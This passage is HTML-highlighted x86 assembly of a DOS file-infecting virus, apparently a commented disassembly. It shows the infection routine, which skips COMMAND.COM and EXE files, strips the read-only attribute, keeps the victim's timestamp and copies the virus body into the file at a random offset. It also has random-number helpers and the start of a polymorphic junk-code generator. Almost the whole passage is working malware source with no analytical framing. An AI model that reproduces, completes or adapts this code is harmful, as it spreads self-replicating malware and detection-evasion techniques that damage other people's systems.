        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">':'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">drive_in_path</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc13">'\'
</span><span class="sc0">        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">other_character</span><span class="sc0">

</span><span class="sc5">drive_in_path</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

</span><span class="sc5">other_character</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">loopne</span><span class="sc0">  </span><span class="sc5">scan_filename</span><span class="sc0">   </span><span class="sc1">; end of ASCIIZ ?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">      </span><span class="sc1">; si points 2 filename</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">105h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">

</span><span class="sc5">test_COMMAND</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DFh</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">loope</span><span class="sc0">   </span><span class="sc5">test_COMMAND</span><span class="sc0">    </span><span class="sc1">; command  in file name?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">is_not_command</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">outta_from_here</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">outta_from_here</span><span class="sc0"> </span><span class="sc1">; do not infect comman.com</span><span class="sc0">

</span><span class="sc5">is_not_command</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">emulate_int_21</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0"> </span><span class="sc5">allocated_64_K</span><span class="sc0">  </span><span class="sc1">; allocate 64 K</span><span class="sc0">

</span><span class="sc5">outta_from_here</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">leave_virus</span><span class="sc0">

</span><span class="sc5">allocated_64_K</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc10">nothing</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4300h</span><span class="sc0">   </span><span class="sc1">; es = allocated segment</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">emulate_int_21</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">free_memory</span><span class="sc0"> </span><span class="sc1">; get attributes</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0"> </span><span class="sc5">not_read_only</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">emulate_int_21</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">free_memory</span><span class="sc0"> </span><span class="sc1">; clear +r attribute</span><span class="sc0">

</span><span class="sc5">not_read_only</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3D02h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">emulate_int_21</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">free_memory</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">      </span><span class="sc1">; handle 2 bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_2_buffer</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">close_victim</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">      </span><span class="sc1">; maximal size reached ! outta from here</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">close_victim</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5120</span><span class="sc0">    </span><span class="sc1">; size is smaller than minimum</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">close_victim</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">close_victim</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'MZ'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">close_victim</span><span class="sc0">    </span><span class="sc1">; do not infect exes</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; push size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5700h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">emulate_int_21</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; pop size</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">close_victim</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">victim_time</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">victim_date</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">      </span><span class="sc1">; store time, date, handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">try_2_infect</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">      </span><span class="sc1">; pop handle</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">emulate_int_21</span><span class="sc0">  </span><span class="sc1">; seek BOF</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">close_victim</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">emulate_int_21</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0BAh</span><span class="sc0"> </span><span class="sc1">; º     ; mov dx,w</span><span class="sc0">
</span><span class="sc5">victim_date</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">188Ah</span><span class="sc0">        </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0B9h</span><span class="sc0"> </span><span class="sc1">; ¹     ; mov cx, w</span><span class="sc0">
</span><span class="sc5">victim_time</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">92CBh</span><span class="sc0">        </span><span class="sc1">; ...</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5701h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">emulate_int_21</span><span class="sc0">

</span><span class="sc5">close_victim</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Eh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">emulate_int_21</span><span class="sc0">

</span><span class="sc5">free_memory</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">49h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">emulate_int_21</span><span class="sc0">

</span><span class="sc5">leave_virus</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0"> </span><span class="sc1">; ¸     ; mov AX, word</span><span class="sc0">
</span><span class="sc5">saved_ss</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">10Bh</span><span class="sc0">         </span><span class="sc1">; ...</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc10">nothing</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0BCh</span><span class="sc0"> </span><span class="sc1">; ¼     ; mov SP,W</span><span class="sc0">
</span><span class="sc5">saved_sp</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0FFF8h</span><span class="sc0">       </span><span class="sc1">; ...</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4B00h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">jmp_old_21</span><span class="sc0">

</span><span class="sc1">; returns 0 - FF</span><span class="sc0">

</span><span class="sc5">rnd_less_100h</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">       </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">rnd_to_AX</span><span class="sc0"> </span><span class="sc1">; returns random number less</span><span class="sc0">
</span><span class="sc5">rnd_less_100h</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">            </span><span class="sc1">; than AX</span><span class="sc0">


</span><span class="sc5">rnd_max_40h</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">     </span><span class="sc1">; returns 0 - 3F</span><span class="sc0">

</span><span class="sc5">unk_0_338</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A9h</span><span class="sc0"> </span><span class="sc1">; ©     ; opcode 4 test ax, word</span><span class="sc0">

</span><span class="sc5">rnd_max_10h</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">      </span><span class="sc1">; returns 0 - F</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A9h</span><span class="sc0"> </span><span class="sc1">; ©     ; test ax, word opcede</span><span class="sc0">

</span><span class="sc5">rnd_max_8</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">       </span><span class="sc1">; returns 0 to 7</span><span class="sc0">

</span><span class="sc5">unk_0_33E</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A9h</span><span class="sc0"> </span><span class="sc1">; ©     ; and again ....</span><span class="sc0">

</span><span class="sc5">rnd_max_4</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">       </span><span class="sc1">; returns 0 - 3</span><span class="sc0">

</span><span class="sc5">unk_0_341</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A9h</span><span class="sc0"> </span><span class="sc1">; ©     ; once more</span><span class="sc0">

</span><span class="sc5">rnd_max_3</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">       </span><span class="sc1">; returns 0 - 2</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0A9h</span><span class="sc0"> </span><span class="sc1">; ©     ; again ...</span><span class="sc0">

</span><span class="sc5">rnd_max_2</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">cbw</span><span class="sc0">

</span><span class="sc5">rnd_to_AX</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">      </span><span class="sc1">; returns random number less</span><span class="sc0">
                    </span><span class="sc1">; than AX</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">produce_random</span><span class="sc0">  </span><span class="sc1">; returns AX</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">      </span><span class="sc1">; 0:RND_in_AX / MAX_RND</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">      </span><span class="sc1">; AX = resuling random number</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">try_2_infect</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">file_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; store size 2 DI</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4096</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_to_AX</span><span class="sc0">   </span><span class="sc1">; returns random number less</span><span class="sc0">
                    </span><span class="sc1">; than AX</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">read_position</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc1">; reads 4096 bytes from file.</span><span class="sc0">
                    </span><span class="sc1">; BOF+32 &lt;= read position &lt;= EOF-4064</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; si = read position in buffer</span><span class="sc0">
                    </span><span class="sc1">; di = end of file</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">       </span><span class="sc1">; move selected block behind EOF</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">start_of_free</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">      </span><span class="sc1">; di - end of app block</span><span class="sc0">
                    </span><span class="sc1">; ax - pointer to free block</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">end_app_block1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">end_app_block2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">end_free_blck1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">end_free_blck2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">    </span><span class="sc1">; point 2 virus start</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2496</span><span class="sc0">    </span><span class="sc1">; size</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">       </span><span class="sc1">; di points to start of freed block in</span><span class="sc0">
                    </span><span class="sc1">; file - we move virus body</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">adress_used</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">push_counter</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc1">; counts # of pushed words</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">stack_watch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">lower_limit</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">; can't generate code below this</span><span class="sc0">
                    </span><span class="sc1">; adress</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">table_pointer</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">mvd_bdy_200_1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">mvd_bdy_200_2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">; put on the end  dd 0!</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">sp_copy</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">      </span><span class="sc1">; init stack variables</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_max_2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">override_switch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc1">; 1 - generate SS: CS: override</span><span class="sc0">
                    </span><span class="sc1">; 0 - in 1 of 256 cases put NOP</span><span class="sc0">

</span><span class="sc5">trash_generator</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">      </span><span class="sc1">; SI = ?</span><span class="sc0">
                    </span><span class="sc1">; BX = pointer for write in file</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0"> </span><span class="sc1">; ¸     ; mov AX,W</span><span class="sc0">
</span><span class="sc5">end_free_blck2</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">1403h</span><span class="sc0">        </span><span class="sc1">; ...</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">trash_selector</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">3Dh</span><span class="sc0"> </span><span class="sc1">; =     ; cmp AX, W</span><span class="sc0">
</span><span class="sc5">lower_limit</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; ...</span><span class="sc0">
                    </span><span class="sc1">; can't generate code below this</span><span class="sc0">
                    </span><span class="sc1">; adress</span><span class="sc0">
